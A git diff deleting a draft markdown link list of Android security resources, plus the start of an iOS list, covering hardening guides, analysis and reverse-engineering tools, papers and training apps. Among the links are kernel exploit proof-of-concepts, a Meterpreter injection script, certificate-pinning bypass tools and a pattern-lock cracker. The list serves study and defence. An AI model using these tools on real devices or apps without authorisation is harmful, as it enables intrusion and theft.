-| **Trustedt Execution Environments(and Android** | https://usmile.at/sites/default/files/androidsecuritysymposium/presentations/Ekberg_AndroidAndTrustedExecutionEnvironments.pdf
-
-
-
-
-
-### **<a name="SecAnd">Securing Android</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **Android (In)Security** - Defcamp 2014 | https://www.youtube.com/watch?v=2aeV1JXYvuQ&index=23&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
-| **Android Forensics Class** - Free - This class serves as a foundation for mobile digital forensics, forensics of Android operating systems, and penetration testing of Android applications.| http://opensecuritytraining.info/AndroidForensics.html)
-| **Android Hardening Guide by the TOR developers** - This blog post describes the installation and configuration of a prototype of a secure, full-featured, Android telecommunications device with full Tor support, individual application firewalling, true cell network baseband isolation, and optional ZRTP encrypted voice and video support. ZRTP does run over UDP which is not yet possible to send over Tor, but we are able to send SIP account login and call setup over Tor independently. The SIP client we recommend also supports dialing normal telephone numbers if you have a SIP gateway that provides trunking service. Aside from a handful of binary blobs to manage the device firmware and graphics acceleration, the entire system can be assembled (and recompiled) using only FOSS components. However, as an added bonus, we will describe how to handle the Google Play store as well, to mitigate the two infamous Google Play Backdoors.| https://blog.torproject.org/blog/mission-impossible-hardening-android-security-and-privacy)
-| **Android 4.0+ Hardening Guide/Checklist by University of Texas** | https://wikis.utexas.edu/display/ISO/Google+Android+Hardening+Checklist)
-
-[Mobile self-defense - Karsten Nohl](https://www.youtube.com/watch?v=GeCkO0fWWqc)
-
-#### Applications
-| Title     | Link |
-| -------- | ------------------------ |
-Firewall
-	* [Android Firewall(Requires Root)](https://play.google.com/store/apps/details?id=com.jtschohl.androidfirewall&hl=en)
-		
-Xprivacy - The Ultimate Android Privacy Manager(Requires Root
-
-	* [Github](https://github.com/M66B/XPrivacy)
-	* [Google Play](https://play.google.com/store/apps/details?id=biz.bokhorst.xprivacy.installer&hl=en)
-
-#### Backups
-[Titanium Backup](https://play.google.com/store/apps/details?id=com.keramidas.TitaniumBackup)
-Personal favorite for making backups. Backups are stored locally or automatically to various cloud services.
-[Helium Backup(Root Not Required)](https://play.google.com/store/apps/details?id=com.koushikdutta.backup&hl=en)
-	* Backs up data locally or to various cloud services. Local client available for backups directly to PC.
-
-	[Stunneller](https://github.com/ultramancool/Stunneler)
-* Android app for easy stunnel usage
-
-### Encryption
-Check the Encryption section of the overall guide for more information.
-
-[Android Reverse Engineering Defenses](https://bluebox.com/wp-content/uploads/2013/05/AndroidREnDefenses201305.pdf)
-
-
-#### **<a name="Vulns">Vulnerabilities</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **List of Android Vulnerabilities** |http://androidvulnerabilities.org/all
-
-[AndroBugs Framework](https://github.com/AndroBugs/AndroBugs_Framework)
-* AndroBugs Framework is an Android vulnerability analysis system that helps developers or hackers find potential security vulnerabilities in Android applications
-
-
-#### **<a name="Exploits">Exploits</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **List of Android Exploits** | https://github.com/droidsec/droidsec.github.io/wiki/Vuln-Exploit-List)
-
-[Android_Kernel_CVE_POC](https://github.com/ScottyBauer/Android_Kernel_CVE_POCs)
-
-[plzdonthack.me](https://plzdonthack.me/)
-* personal site of scotty bauer
-
-
-### **<a name="DAnalysis">Device Analysis</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **android-cluster-toolkit** - The Android Cluster Toolkit helps organize and manipulate a collection of Android devices. It was designed to work with a collection of devices connected to the same host machine, either directly or via one or more tiers of powered USB hubs. The tools within can operate on single devices, a selected subset, or all connected devices at once. |https://github.com/jduck/android-cluster-toolkit
-| **privmap - android** - A tool for enumerating the effective privileges of processes on an Android device.  |https://github.com/jduck/privmap
-| **canhazaxs** - A tool for enumerating the access to entries in the file system of an Android device. |https://github.com/jduck/canhazaxs
-| **Android Device Testing Framework(DTF)** - The Android Device Testing Framework ("dtf") is a data collection and analysis framework to help individuals answer the question: "Where are the vulnerabilities on this mobile device?" Dtf provides a modular approach and built-in APIs that allows testers to quickly create scripts to interact with their Android devices. The default download of dtf comes with multiple modules that allow testers to obtain information from their Android device, process this information into databases, and then start searching for vulnerabilities (all without requiring root privileges). These modules help you focus on changes made to AOSP components such as applications, frameworks, system services, as well as lower-level components such as binaries, libraries, and device drivers. In addition, you'll be able to analyze new functionality implemented by the OEMs and other parties to find vulnerabilities. |https://github.com/jakev/dtf/tree/v1.0.3
-| **drozer** - drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.| https://github.com/mwrlabs/drozer
-
-
-
-### **<a name="AppAnalysis">Application Analysis</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **APK Studio - Android Reverse Engineering** - APK Studio is an IDE for decompiling/editing & then recompiling of android application binaries. Unlike initial release being Windows exclusive & also didn't support frameworks, this one is completely re-written using QT for cross-platform support. You can now have multiple frameworks installed & pick a particular one on a per project basis|https://apkstudio.codeplex.com/
-| **Smali-CFGs** - Smali Control-Flow-Graphs | https://github.com/EugenioDelfa/Smali-CFGs
-| **PID Cat** - An update to Jeff Sharkey's excellent logcat color script which only shows log entries for processes from a specific application package. During application development you often want to only display log messages coming from your app. Unfortunately, because the process ID changes every time you deploy to the phone it becomes a challenge to grep for the right thing. This script solves that problem by filtering by application package. Supply the target package as the sole argument to the python script and enjoy a more convenient development process. | https://github.com/JakeWharton/pidcat
-| **AndBug - Scriptable Android Debugger** - AndBug is a debugger targeting the Android platform's Dalvik virtual machine intended for reverse engineers and developers. It uses the same interfaces as Android's Eclipse debugging plugin, the Java Debug Wire Protocol (JDWP) and Dalvik Debug Monitor (DDM) to permit users to hook Dalvik methods, examine process state, and even perform changes.| https://github.com/swdunlop/AndBug
-| **android-lkms** - Android Loadable Kernel Modules - mostly used for reversing and debugging on controlled systems/emulators.| https://github.com/strazzere/android-lkms
-| **Simplify - Simple Android Deobfuscator** - Simplify uses a virtual machine to understand what an app does. Then, it applies optimizations to create code that behaves identically, but is easier for a human to understand. Specifically, it takes Smali files as input and outputs a Dex file with (hopefully) identical semantics but less complicated structure. | https://github.com/CalebFenton/simplify
-
-[Cuckoo-Droid](https://github.com/i[danr1986/cuckoo-droid/blob/master/README.md)
-* CuckooDroid is an extension of Cuckoo Sandbox the Open Source software for automating analysis of suspicious files, CuckooDroid brigs to cuckoo the capabilities of execution and analysis of android application.
-
-[elsim - Elements Similarities](https://code.google.com/p/elsim/wiki/Similarity#Diffing_of_applications)
-* Similarities/Differences of applications (aka rip-off indicator)
-* This tool detects and reports: the identical methods; the similar methods; the deleted methods; the new methods; the skipped methods. 
-
-
-### **<a name="Dynamic">Dynamic Analysis</a>**
- | Title     | Link |
-| -------- | ------------------------ |
-| **APKInspector** - APKinspector is a powerful GUI tool for analysts to analyze the Android applications.| https://github.com/honeynet/apkinspector/ 
-| DroidBox** - DroidBox is developed to offer dynamic analysis of Android applications. Additionally, two images are generated visualizing the behavior of the package. One showing the temporal order of the operations and the other one being a treemap that can be used to check similarity between analyzed packages.| https://code.google.com/p/droidbox/)
- | **ddi - Dynamic Dalvik Instrumentation Toolkit** - Simple and easy to use toolkit for dynamic instrumentation of Dalvik code. Instrumentation is based on library injection and hooking method entry points (in-line hooking). The actual instrumentation code is written using the JNI interface. The DDI further supports loading additional dex classes into a process. This enables instrumentation code to be partially written in Java and thus simplifies interacting with the instrumented process and the Android framework.|https://github.com/crmulliner/ddi
-| **Hooker** - Hooker is an opensource project for dynamic analyses of Android applications. This project provides various tools and applications that can be use to automaticaly intercept and modify any API calls made by a targeted application.  It leverages Android Substrate framework to intercept these calls and aggregate all their contextual information (parameters, returned values, ...). Collected information can either be stored in a distributed database (e.g. ElasticSearch) or in json files.  A set of python scripts is also provided to automatize the execution of an analysis to collect any API calls made by a set of applications.|https://github.com/AndroidHooker/hooker
-| **Android-SSL-TrustKiller** - Blackbox tool to bypass SSL certificate pinning for most applications running on a device.|https://github.com/iSECPartners/Android-SSL-TrustKiller
-| (**JustTrustMe - Cert Pinning using Xposed** - An xposed module that disables SSL certificate checking. This is useful for auditing an appplication which does certificate pinning. You can read about the practice of cert pinning here(1). There also exists a nice framework built by @moxie to aid in pinning certs in your app: certificate pinning|https://github.com/fuzion24/justtrustme
-| **AndroidPinning** - AndroidPinning is a standalone Android library project that facilitates certificate pinning for SSL connections from Android apps, in order to minimize dependence on Certificate Authorities. | https://github.com/moxie0/AndroidPinning
-
-[AndBug - A Scriptable Android Debugger](https://github.com/swdunlop/AndBug)
-* AndBug is a debugger targeting the Android platform's Dalvik virtual machine intended for reverse engineers and developers. It uses the same interfaces as Android's Eclipse debugging plugin, the Java Debug Wire Protocol (JDWP) and Dalvik Debug Monitor (DDM) to permit users to hook Dalvik methods, examine process state, and even perform changes.
-
-[android-gdb](https://github.com/darchons/android-gdb)
-* GDB fork targetting Android/Fennec development
-
-[How to avoid certificate pinning in the latest versions of Android](https://www.welivesecurity.com/2016/09/08/avoid-certificate-pinning-latest-versions-androidESET%20Blog:%20We%20Live%20Security)
-
-
-
-### **<a name="Static">Static Analysis</a>**
- | Title     | Link |
-| -------- | ------------------------ |
-| **Disect Android APKs like a Pro - Static code analysis** |http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/
-| **Androguard** - Androguard is mainly a tool written in python to play with: Dex/Odex (Dalvik virtual machine) (.dex) (disassemble, decompilation), APK (Android application) (.apk), Android's binary xml (.xml), Android Resources (.arsc). Androguard is available for Linux/OSX/Windows (python powered).| https://code.google.com/p/androguard
-| **Dexter** - Dexter is a static android application analysis tool. | http://dexter.dexlabs.org/accounts/login/?next=/dashboard)
-| **Static Code Analysis of Major Android Web Browsers** |http://opensecurity.in/research/security-analysis-of-android-browsers.html
-| **Androwarn** - Androwarn is a tool whose main aim is to detect and warn the user about potential malicious behaviours developped by an Android application. The detection is performed with the static analysis of the application's Dalvik bytecode, represented as Smali. This analysis leads to the generation of a report, according to a technical detail level chosen from the user.| https://github.com/maaaaz/androwarn
-| **Thresher** - Thresher is a static analysis tool that specializes in checking heap reachability properties. Its secret sauce is using a coarse up-front points-to analysis to focus a precise symbolic analysis on the alarms reported by the points-to analysis.|http://pl.cs.colorado.edu/projects/thresher/)
-| **[PAPER]Thresher: Precise Refutations for Heap Reachability** |http://www.cs.colorado.edu/~sabl4745/papers/pldi13-thresher.pdf
-| **lint - Static Analysis** - The Android lint tool is a static code analysis tool that checks your Android project source files for potential bugs and optimization improvements for correctness, security, performance, usability, accessibility, and internationalization.|https://developer.android.com/tools/help/lint.html
-| **Flow Droid - Taint Analysis** - FlowDroid is a context-, flow-, field-, object-sensitive and lifecycle-aware static taint analysis tool for Android applications. |http://sseblog.ec-spride.de/tools/flowdroid/
-| **[PAPER]FlowDroid: Precise Context, Flow, Field, Object-sensitive and Lifecycle-aware Taint Analysis for Android Apps** - In this work we thus present F LOW D ROID , a novel and highly precise static taint analysis for Android applications. A precise model of Android’s lifecycle allows the analysis to properly handle callbacks invoked by the Android framework, while context, flow, field and object-sensitivity allows the analysis to reduce the number of false alarms. Novel on-demand algorithms help F LOW D ROID maintain high efficiency and precision at the same time| http://www.bodden.de/pubs/far+14flowdroid.pdf
-| **dedex** - Is a command line tool for disassembling Android DEX files.|https://github.com/mariokmk/dedex
-| **DexMac** - Is a native OSX application for disassembling Android DEX files. | https://github.com/mariokmk/DexMac
-| **dexdissasembler** - Is a GTK tool for disassembling Android DEX files. }https://github.com/mariokmk/dexdisassemble
-| **dex.Net** - A Mono/.NET library to parse Android DEX files. Its main purpose is to support utilities for disassembling and presenting the contents of DEX files. | (https://github.com/mariokmk/dex.net
-| **apk2gold** - CLI tool for decompiling Android apps to Java. It does resources! It does Java! Its real easy! | https://github.com/lxdvs/apk2gold
-| **Android Unpacker presented at Defcon 22: Android Hacker Protection Level 0** |https://github.com/strazzere/android-unpacker
-| **byte-code viewer** - Bytecode Viewer is an Advanced Lightweight Java Bytecode Viewer, GUI Java Decompiler, GUI Bytecode Editor, GUI Smali, GUI Baksmali, GUI APK Editor, GUI Dex Editor, GUI APK Decompiler, GUI DEX Decompiler, GUI Procyon Java Decompiler, GUI Krakatau, GUI CFR Java Decompiler, GUI FernFlower Java Decompiler, GUI DEX2Jar, GUI Jar2DEX, GUI Jar-Jar, Hex Viewer, Code Searcher, Debugger and more. It's written completely in Java, and it's open sourced. It's currently being maintained and developed by Konloch. | https://github.com/Konloch/bytecode-viewer
-
-[Disect Android APKs like a Pro - Static code analysis](http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/)
-
-
-
-
-
-### **<a name="OnlineAPK">Online APK Analyzers</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **Mobile Sandbox** - Provide an Android application file (apk-file) and the Mobile-Sandbox will analyze the file for any malicious behaviour.|http://mobilesandbox.org/
-| **CopperDroid** - Upload an .apk for static analysis|http://copperdroid.isg.rhul.ac.uk/copperdroid/
-| **Andrototal** - AndroTotal is a free service to scan suspicious APKs against multiple mobile antivirus apps. | http://andrototal.org/
-
-
-
-### **<a name="APlatforms">Attack Platforms</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **drozer** - drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.|https://github.com/mwrlabs/drozer
-| **Android Tamer** - Android Tamer is a one stop tool required to perform any kind of operations on Android devices / applications / network VM| http://androidtamer.com/
-
-
-
-### **<a name="Malware">Android Malware</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **Rundown of Android Packers** |http://www.fortiguard.com/uploads/general/Area41Public.pdf
-| **APK File Infection on an Android System** | https://www.youtube.com/watch?v=HZI1hCdqKjQ&amp;list=PLCDA5DF85AD6B4ABD
-| **Manifesto** - PoC framework for APK obfuscation, used to demonstrate some of the obfuscation examples from http://maldr0id.blogspot.com. It supports plugins (located in processing directory) that can do different obfuscation techniques. Main gist is that you run manifesto on the APK file and it produces an obfuscated APK file. |https://github.com/maldroid/manifesto
-| **Android Hacker Protection Level 0** - DEF CON 22 - Tim Strazzere and Jon Sawyer - Obfuscator here, packer there - the Android ecosystem is becoming a bit cramped with different protectors for developers to choose. With such limited resources online about attacking these protectors, what is a new reverse engineer to do? Have no fear, after drinking all the cheap wine two Android hackers have attacked all the protectors currently available for everyones enjoyment! Whether you've never reversed Android before or are a hardened veteran there will be something for you, along with all the glorious PoC tools and plugins for your little heart could ever desire. | https://www.youtube.com/watch?v=vLU92bNeIdI
-
-[kwetza](https://github.com/sensepost/kwetza)
-* Python script to inject existing Android applications with a Meterpreter payload.
-
-
-
-### **<a name="RE">Reverse Engineering Android</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **APK Studio - Android Reverse Engineering** - APK Studio is an IDE for decompiling/editing & then recompiling of android application binaries. Unlike initial release being Windows exclusive & also didn't support frameworks, this one is completely re-written using QT for cross-platform support. You can now have multiple frameworks installed & pick a particular one on a per project basis. |https://apkstudio.codeplex.com/
-| **Android apk-tool** - It is a tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications; it makes possible to debug smali code step by step. Also it makes working with app easier because of project-like files structure and automation of some repetitive tasks like building apk, etc.  | https://code.google.com/p/android-apktool/
-| **Reversing and Auditing Android’s Proprietary bits** |http://www.slideshare.net/joshjdrake/reversing-and-auditing-androids-proprietary-bits
-| **Smali** - smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android's Java VM implementation. The syntax is loosely based on Jasmin's/dedexer's syntax, and supports the full functionality of the dex format (annotations, debug info, line info, etc.)  |https://code.google.com/p/smali/
-| APKinpsector** - APKinspector is a powerful GUI tool for analysts to analyze the Android applications.| https://github.com/honeynet/apkinspector/
-| **Dexter** - Dexter is a static android application analysis tool |http://dexter.dexlabs.org/accounts/login/?next=/dashboard
-| **Reversing Android Apps Slides** | http://www.floyd.ch/download/Android_0sec.pdf
-
-[AndroChef](http://androiddecompiler.com/)
-* AndroChef Java Decompiler is Windows XP, Windows 2003, Windows Vista, Windows 7, Windows 8, 8.1 decompiler for Java that reconstructs the original source code from the compiled binary CLASS files. AndroChef Java Decompiler is able to decompile the most complex Java 6 applets and binaries, producing accurate source code.  AndroChef successfully decompiles obfuscated Java 6 and Java 7 .class and .jar files. Support Java language features like generics, enums and annotations. According to some studies, AndroChef Java Decompiler is able to decompile 98.04% of Java applications generated with traditional Java compilers- a very high recovery rate. It is simple but powerful tool that allows you to decompile Java and Dalvik bytecode (DEX, APK) into readable Java source. Easy to use.
-
-[Instrumenting Android Applications with Frida](http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html)
-
-[smali_emulator](https://github.com/evilsocket/smali_emulator)
-* This software will emulate a smali source file generated by apktool. 
-
-[ARE - Virtual Machine for Android Reverse Engineering](https://redmine.honeynet.org/projects/are)
-
-[Android Applications Reversing 101](https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101)
-
-[Android Crackmes](http://www.droidsec.org/wiki/#crack-mes)
-
-[Hacking Android apps with FRIDA I](https://www.codemetrix.net/hacking-android-apps-with-frida-1/)
-
-[Want to break some Android apps? - Android Crackmes- Carnal0wnage](http://carnal0wnage.attackresearch.com/2013/08/want-to-break-some-android-apps.html)
-
-[Dex Education 201 - Anti-Emulation.pdf](https://github.com/strazzere/anti-emulator/blob/master/slides/Dex%20Education%20201%20-%20Anti-Emulation.pdf)
-
-[List of Android Crackmes](https://forum.tuts4you.com/topic/33057-android-hackmes/)
-
-[baredroid](https://github.com/ucsb-seclab/baredroid)
-* BareDroid allows for bare-metal analysis on Android devices.
-* [Paper](https://www.cs.ucsb.edu/%7Evigna/publications/2015_ACSAC_Baredroid.pdf)
-
-
-
-
-### **<a name="Papers">Interesting Android Papers</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **List of important whitepapers** | https://github.com/droidsec/droidsec.github.io/wiki/Android-Whitepapers
-| **Peeking into Your App without Actually Seeing It: UI State Inference and Novel Android Attacks** | http://www.cs.ucr.edu/~zhiyunq/pub/sec14_android_activity_inference.pdf|
-| **Execute This! Analyzing Unsafe and Malicious Dynamic Code Loading in Android Applications** |https://anonymous-proxy-servers.net/paper/android-remote-code-execution.pdf
-| **Rage Against the Droid: Hindering Dynamic analysis of android malware** | http://www.syssec-project.eu/m/page-media/3/petsas_rage_against_the_virtual_machine.pdf
-| **APKLancet: Tumor Payload Diagnosis and Purification for Android Applications** | http://loccs.sjtu.edu.cn/typecho/usr/uploads/2014/04/1396105336.pdf
-| **DroidRay: A Security Evaluation System for CustomizedAndroid Firmwares** | http://www.cs.cuhk.hk/~cslui/PUBLICATION/ASIACCS2014DROIDRAY.pdf
-| **VirtualSwindle: An Automated Attack Against In-App Billing on Android** | http://seclab.ccs.neu.edu/static/publications/asiaccs14virtualswindle.pdf
-| **Evading Android Runtime Analysis via Sandbox Detection** | https://www.andrew.cmu.edu/user/nicolasc/publications/VC-ASIACCS14.pdf
-| **Enter Sandbox: Android Sandbox Comparison** | http://www.mostconf.org/2014/papers/s3p1.pdf
-| **Post-Mortem Memory Analysis of Cold-Booted Android Devices** | http://www.homac.de/publications/Post-Mortem-Memory-Analysis-of-Cold-Booted-Android-Devices.pdf
-| **Upgrading Your Android, Elevating My Malware: Privilege Escalation Through Mobile OS Updating** | http://www.informatics.indiana.edu/xw7/papers/privilegescalationthroughandroidupdating.pdf
-| **Exploring Android KitKat Runtime** | http://www.haxpo.nl/wp-content/uploads/2014/02/D1T2-State-of-the-Art-Exploring-the-New-Android-KitKat-Runtime.pdf
-| **Analyzing Inter-Application Communication in Android** | https://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf
-| **Automatically Exploiting Potential Component Leaks in Android Applications** | http://orbilu.uni.lu/bitstream/10993/16914/1/tr-pcLeaks.pdf
-| **I know what leaked in your pocket: uncovering privacy leaks on Android Apps with Static Taint Analysis** | http://arxiv.org/pdf/1404.7431v1.pdf
-| **Bifocals: Analyzing WebView Vulnerabilities in Android Applications** | http://www.eecs.berkeley.edu/~emc/papers/Chin-WISA-WebViews.pdf
-| **Analyzing Android Browser Apps for file:// Vulnerabilities** | http://arxiv.org/pdf/1404.4553v3.pdf
-| **FlowDroid: Precise Context, Flow, Field, Object-sensitive and Lifecycle-aware Taint Analysis for Android Apps** | http://sseblog.ec-spride.de/wp-content/uploads/2013/05/pldi14submissionFlowdroid.pdf
-| **Detecting privacy leaks in Android Apps** | https://publications.uni.lu/bitstream/10993/16916/1/ESSoS-DS2014-Li.pdf
-| **From Zygote to Morula: Fortifying Weakened ASLR on Android** | http://www.cc.gatech.edu/~blee303/paper/morula.pdf
-| **Apposcopy: Semantics-Based Detection of Android Malware through Static Analysis](http://www.cs.utexas.edu/~yufeng/papers/fse14.pdf
-| **MAdFraud: Investigating Ad Fraud in Android Applications](http://www.cs.ucdavis.edu/~hchen/paper/mobisys2014.pdf
-| **Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security** | http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf
-| **AsDroid: Detecting Stealthy Behaviors in Android Applications by User Interface and Program Behavior Contradiction** | https://ece.uwaterloo.ca/~lintan/publications/asdroid-icse14.pdf
-| **NativeGuard: Protecting Android Applications from Third-Party Native Libraries**|http://www.cse.lehigh.edu/~gtan/paper/nativeguard.pdf
-| **Into the Droid: Gaining Access to Android User Data** - DEFCON |https://www.youtube.com/watch?v=MxhIo95VccI&amp;list=PLCDA5DF85AD6B4ABD)
-| **Android Packers** | http://www.fortiguard.com/uploads/general/Area41Public.pdf
-| **Xprivacy Android** | https://github.com/M66B/XPrivacy#description
-| **An Empirical Study of Cryptographic Misuse in Android Applications** | https://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf
-| **PowerSpy: Location Tracking using Mobile Device Power Analysis** | http://arxiv.org/abs/1502.03182
-| **Obfuscation in Android malware, and how to fight back** | https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
-
-[PatchDroid: Scalable Third-Party Security Patches for Android Devices](http://www.mulliner.org/collin/academic/publications/patchdroid.pdf)
-* Android is currently the largest mobile platform with around 750 million devices worldwide. Unfortunately, more than 30% of all devices contain publicly known security vulnera- bilities and, in practice, cannot be updated through normal mechanisms since they are not longer supported by the man- ufacturer and mobile operator. This failure of traditional patch distribution systems has resulted in the creation of a large population of vulnerable mobile devices. In this paper, we present PatchDroid, a system to dis- tribute and apply third-party security patches for Android. Our system is designed for device-independent patch cre- ation, and uses in-memory patching techniques to address vulnerabilities in both native and managed code. We created a fully usable prototype of PatchDroid, including a number of patches for well-known vulnerabilities in Android devices. We evaluated our system on different devices from multiple manufacturers and show that we can effectively patch se- curity vulnerabilities on Android devices without impacting performance or usability. Therefore, PatchDroid represents a realistic path towards dramatically reducing the number of exploitable Android devices in the wild.
-
-[Dissecting the Android Bouncer](https://www.duosecurity.com/blog/duo-tech-talks-dissecting-the-android-bouncer)
-
-
-
-### **<a name="Education">Educational Material</a>**
-| Title     | Link |
-| -------- | ------------------------ |
-| **OWASP GoatDroid** - “OWASP GoatDroid is a fully functional and self-contained training environment for educating developers and testers on Android security. GoatDroid requires minimal dependencies and is ideal for both Android beginners as well as more advanced users. The project currently includes two applications: FourGoats, a location-based social network, and Herd Financial, a mobile banking application. There are also several feature that greatly simplify usage within a training environment or for absolute beginners who want a good introduction to working with the Android platform.” |https://www.owasp.org/index.php/Projects/OWASP_GoatDroid_Project
-| **Insecure Bank v2** - This vulnerable Android application is named "InsecureBankv2" and is made for security enthusiasts and developers to learn the Android insecurities by testing this vulnerable application. Its back-end server component is written in python. The client component i.e. the Android InsecureBank.apk can be downloaded along with the source code.  |https://github.com/dineshshetty/Android-InsecureBankv2
-
-
-[Put a Sock(et) in it: Understanding and Attacking Sockets on Android](http://www.irongeek.com/i.php?page=videos/bsidesnashville2016/r04-put-a-socket-in-it-understanding-and-attacking-sockets-on-android-jake-valletta)
-* You're probably wondering how someone could possibly fill a 45 minute slot talking about the security implications of sockets (after all, there are only TCP and UDP sockets, right?). In reality, there are several unique types of sockets used by an Android device. These range from network sockets (the ones we are all familiar with), to local sockets, and even kernel-level sockets. When used improperly, these sockets can have devastating effects on the overall security of a device. In this talk, I'll discuss several types of Linux-based sockets found on Android devices and how these sockets have historically been used to compromise devices. I'll also provide the tools and techniques necessary to enumerate and interact with these sockets on your own device.
-
-[Android apps in sheep's clothing](http://www.modzero.ch/modlog/archives/2015/04/01/android_apps_in_sheeps_clothing/index.html)
-* We identified a security weakness in Android's approach of handling UI elements, circumventing parts of Android's sandboxing approach. While this attack is simple from a technical point of view, the impact of exploiting such a vulnerability is significant. It affects Android based devices as well as Blackberry mobile devices running the Android runtime environment.
-
-
-
-
-
-### **<a name="Write">Write-ups</a>**
- | Title     | Link |
-| -------- | ------------------------ |
-| **Inside the Android Play Service's magic OAuth flow** - Owning google accounts on android devices | http://sbktech.blogspot.com/2014/01/inside-android-play-services-magic.html
-| **Security enhancements in android through its versions** | www.androidtamer.com
-| **Understanding the Android bytecode** - Writeup on reversing/understanding Android Bytecode| https://mariokmk.github.io/programming/2015/03/06/learning-android-bytecode.html
-| **ClockLockingBeats** - Repo for the DARPA CFT / Clock Locking Beats project. Exploring Android kernel and processor interactions to hide running threads |https://github.com/monk-dot/ClockLockingBeats
-
-[Hacking Android phone. How deep the rabbit hole goes.](https://hackernoon.com/hacking-android-phone-how-deep-the-rabbit-hole-goes-18b62ad65727#.txib8od0m)
-
-[Android Bytecode Obfuscation - Patrick Schulz 2012](http://dexlabs.org/blog/bytecode-obfuscation)
-[Android Pattern Lock Cracker](https://github.com/sch3m4/androidpatternlock) 
-*  A little Python tool to crack the Pattern Lock on Android devices
-
-
-### **<a name="Books">Books</a>**
- | Title     | 
-| -------- |
-| Android Hackers Handbook
-| Android System Security Internals
-
-
-### **<a name="Other">Other</a>**
- | Title     | Link |
-| -------- | ------------------------ |
- | **Android-x86 Project - Run Android on Your PC** - This is a project to port Android open source project to x86 platform, formerly known as "patch hosting for android x86 support". The original plan is to host different patches for android x86 support from open source community. A few months after we created the project, we found out that we could do much more than just hosting patches. So we decide to create our code base to provide support on different x86 platforms, and set up a git server to host it.|http://www.android-x86.org/
-| **Root Tools** - RootTools provides rooted developers a standardized set of tools for use in the development of rooted applications | https://github.com/Stericson/RootTools
-
-
-[Protect Your Java Code — Through Obfuscators And Beyond](https://www.excelsior-usa.com/articles/java-obfuscators.html)
-[fdroidcl](https://github.com/mvdan/fdroidcl#advantages-over-the-android-clientx)
-* F-Droid desktop client.
-
-
-[Heimdall](https://github.com/Benjamin-Dobell/Heimdall)
-* Heimdall is a cross-platform open-source tool suite used to flash firmware (aka ROMs) onto Samsung Galaxy S devices.
-
-
-[hbootdbg](https://github.com/sogeti-esec-lab/hbootdbg/)
-* Debugger for HTC phones bootloader (HBOOT). 
-
-[playdrone](https://github.com/nviennot/playdrone)
-* Google Play Crawler
-
-
-| Title     | Link |
-| -------- | ------------------------ |
\ No newline at end of file
diff --git a/Draft/Attacking Defending iOS -.md b/Draft/Attacking Defending iOS -.md
deleted file mode 100755
index cdf4c0e..0000000
--- a/Draft/Attacking Defending iOS -.md	
+++ /dev/null
@@ -1,178 +0,0 @@
-## Attacking & Defending iOS
-
-
-
-
-
-
-#### TOC
-[Cull](#cull)
-[Hardening Guides](#harden)
-[Techniques](#tech)
-[Training & Tutorials](#train)
-[Security Testing Methodologies](#test)
-[General Research Papers](#research)
-[Reverse Engineering](#re)
-[Jailbreaking](#jail)
-
-
-#### <a name="cull">Cull</a>
-
-| Title     | Link |
-| -------- | ------------------------ |
-| **iOS 678 Security - A Study in Fail** | https://www.syscan.org/index.php/download/get/bec31d45168aa331fc01f84451e11186/SyScan15%20Stefan%20Esser%20-%20iOS%20678%20Security%20-%20A%20Study%20in%20Fail.pdf
-| **Jailbreak Stories - Cyril Cattiaux(pod2g) - WWJC 2014** | https://www.youtube.com/watch?v=OBFLTb-AY38
-| **Mobile self-defense - Karsten Nohl** | https://www.youtube.com/watch?v=GeCkO0fWWqc
-| **Pentesting iOS Applications - Pentester Academy - Paid Course** - This course focuses on the iOS platform and application security and is ideal for pentesters, researchers and the casual iOS enthusiast who would like to dive deep and understand how to analyze and systematically audit applications on this platform using a variety of bleeding edge tools and techniques. | http://www.pentesteracademy.com/course?id=2
-
-[Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
-
-* Redo formatting
-#### End Cull
-
-### General
-
-[Hacking Your Way Up The Mobile Stack](http://vimeo.com/51270090)
-
-[iOS Application Security Review Methodology](http://research.aurainfosec.io/ios-application-security-review-methodology/#snapshot)
-* aurainfosec
-
-[Secure iOS application development](https://github.com/felixgr/secure-ios-app-dev)
-* This guide is a collection of the most common vulnerabilities found in iOS applications. The focus is on vulnerabilities in the applications’ code and only marginally covers general iOS system security, Darwin security, C/ObjC/C++ memory safety, or high-level application security. Nevertheless, hopefully the guide can serve as training material to iOS app developers that want to make sure that they ship a more secure app. Also, iOS security reviewers can use it as a reference during assessments.
-
-[needle](https://github.com/mwrlabs/needle)
-* Needle is an open source, modular framework to streamline the process of conducting security assessments of iOS apps.
-
-
-
-### <a name="harden">List of Hardening Guides for iOS</a>
-
-| Title     | Link |
-| -------- | ------------------------ |
-| **Excellent forum post detailing general security practices** | https://forum.raymond.cc/threads/hardening-apple-ios-iphone-ipad-ipod.37451/
-| **Apple’s white paper on their security mechanisms built into iOS** | https://images.apple.com/ipad/business/docs/iOS_Security_Feb14.pdf)
-|  **University of Texas’s Checklist/Guide to securing iOS** | https://wikis.utexas.edu/display/ISO/Apple+iOS+Hardening+Checklist
